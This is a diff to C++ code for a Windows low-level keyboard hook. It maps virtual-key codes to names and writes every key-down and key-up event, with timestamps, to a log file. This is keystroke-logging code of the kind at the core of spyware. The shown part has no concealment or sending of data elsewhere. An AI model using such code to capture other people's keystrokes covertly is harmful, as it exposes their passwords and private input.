@@ -113,38 +113,43 @@ std::string GetKeyName(DWORD vkCode) {
     UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
     LONG lParam = scanCode << 16;
 
-    if (vkCode == 0) {
-        switch (vkCode) {
-            case VK_SHIFT: return "[SHIFT]";
-            case VK_CONTROL: return "[CTRL]";
-            case VK_MENU: return "[ALT]";
-            case VK_ESCAPE: return "[ESC]";
-            case VK_RETURN: return "[ENTER]";
-            case VK_SPACE: return "[SPACE]";
-            case VK_BACK: return "[BACKSPACE]";
-            case VK_TAB: return "[TAB]";
-            case VK_CAPITAL: return "[CAPSLOCK]";
-            case VK_LEFT: return "[LEFT ARROW]";
-            case VK_RIGHT: return "[RIGHT ARROW]";
-            case VK_UP: return "[UP ARROW]";
-            case VK_DOWN: return "[DOWN ARROW]";
-            case VK_PRIOR: return "[PAGE UP]";
-            case VK_NEXT: return "[PAGE DOWN]";
-            case VK_HOME: return "[HOME]";
-            case VK_END: return "[END]";
-            case VK_INSERT: return "[INSERT]";
-            case VK_DELETE: return "[DELETE]";
-            case VK_NUMLOCK: return "[NUMLOCK]";
-            case VK_SNAPSHOT: return "[PRINT SCREEN]";
-            case VK_SCROLL: return "[SCROLL LOCK]";
-            case VK_PAUSE: return "[PAUSE]";
-            default: return "[UNKNOWN]";
-        }
+    switch (vkCode) {
+        case VK_SHIFT: return "[SHIFT]";
+        case VK_LSHIFT: return "[LSHIFT]";
+        case VK_RSHIFT: return "[RSHIFT]";
+        case VK_CONTROL: return "[CTRL]";
+        case VK_LCONTROL: return "[LCTRL]";
+        case VK_RCONTROL: return "[RCTRL]";
+        case VK_MENU: return "[ALT]";
+        case VK_LMENU: return "[LALT]";
+        case VK_RMENU: return "[RALT]";
+        case VK_ESCAPE: return "[ESC]";
+        case VK_RETURN: return "[ENTER]";
+        case VK_SPACE: return "[SPACE]";
+        case VK_BACK: return "[BACKSPACE]";
+        case VK_TAB: return "[TAB]";
+        case VK_CAPITAL: return "[CAPSLOCK]";
+        case VK_LEFT: return "[LEFT ARROW]";
+        case VK_RIGHT: return "[RIGHT ARROW]";
+        case VK_UP: return "[UP ARROW]";
+        case VK_DOWN: return "[DOWN ARROW]";
+        case VK_PRIOR: return "[PAGE UP]";
+        case VK_NEXT: return "[PAGE DOWN]";
+        case VK_HOME: return "[HOME]";
+        case VK_END: return "[END]";
+        case VK_INSERT: return "[INSERT]";
+        case VK_DELETE: return "[DELETE]";
+        case VK_NUMLOCK: return "[NUMLOCK]";
+        case VK_SNAPSHOT: return "[PRINT SCREEN]";
+        case VK_SCROLL: return "[SCROLL LOCK]";
+        case VK_PAUSE: return "[PAUSE]";
+        case VK_LWIN: return "[LWIN]";
+        case VK_RWIN: return "[RWIN]";
+        default: break;
     }
 
     if (GetKeyNameTextW(lParam, keyNameW, 256)) {
         char keyNameA[256] = {0};
-        std::cout << lParam;
         WideCharToMultiByte(CP_ACP, 0, keyNameW, -1, keyNameA, 256, NULL, NULL);
         return keyNameA;
     }
@@ -156,9 +161,23 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0) {
         KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
 
-        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+        if (wParam) {
             std::string keyName = GetKeyName(pKey->vkCode);
-            g_logFile << "[" << GetTimestamp() << "] Key pressed: " << keyName << std::endl;
+            std::string keyState;
+
+            if(wParam == WM_KEYDOWN){
+                keyState = "Key Down    ";
+            }
+            else if(wParam == WM_KEYUP){
+                keyState = "Key UP      ";
+            }
+            else if(wParam == WM_SYSKEYUP){
+                keyState = "Sys Key UP  ";
+            }
+            else if(wParam == WM_SYSKEYDOWN){
+                keyState = "Sys Key DOWN";
+            }
+            g_logFile << "[" << GetTimestamp() << "] " << keyState << ": " << keyName << std::endl;
         }
     }
 
